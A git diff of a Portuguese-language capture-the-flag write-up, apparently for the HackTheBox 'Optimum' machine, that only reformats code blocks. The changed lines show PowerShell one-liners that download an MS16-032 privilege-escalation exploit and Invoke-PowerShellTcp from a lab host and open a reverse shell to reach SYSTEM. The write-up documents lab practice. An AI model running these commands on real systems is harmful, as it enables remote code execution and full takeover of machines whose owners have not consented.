@@ -1433,7 +1433,7 @@ Seguindo essas intrucoes do codigo, vamos tentar obter nossa reverse shell de SY
 
 Primeira tentativa sem exito.. :/
 
-`IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"     `
+```IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3003"```
 
 ![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/9.jpg)
 
@@ -1447,13 +1447,13 @@ Eu precisava de um POWERSHEL certo? Entao, da minha primeira reverse eu estava e
 
 Entao ajustei passando o PATH direto ficando assim..
 
-`C:\Users\kostas\Desktop>C:\windows\sysnative\windowspowershell\v1.0\powershell -exec bypass .\shell.ps1`
+```C:\Users\kostas\Desktop>C:\windows\sysnative\windowspowershell\v1.0\powershell -exec bypass .\shell.ps1```
 
 E deppois ja com minha nova reverse shell em 64bits executei o seguinte..
 
-`PS C:\Users\kostas\Desktop>IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Byp
+```PS C:\Users\kostas\Desktop>IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Byp
 ass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 3
-003" `
+003" ```
 
 pronto, finalmente SYSTEM!
 
@@ -1464,8 +1464,6 @@ Como saber se sua rev eh 32 ou 64? simples...
 `if($env:PROCESSOR_ARCHITECTURE -eq "x86"){"32-Bit CPU"}Else{"64-Bit CPU"}`
 
 ![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/11.jpg)
-
-
 
 FLAG ROOT
 
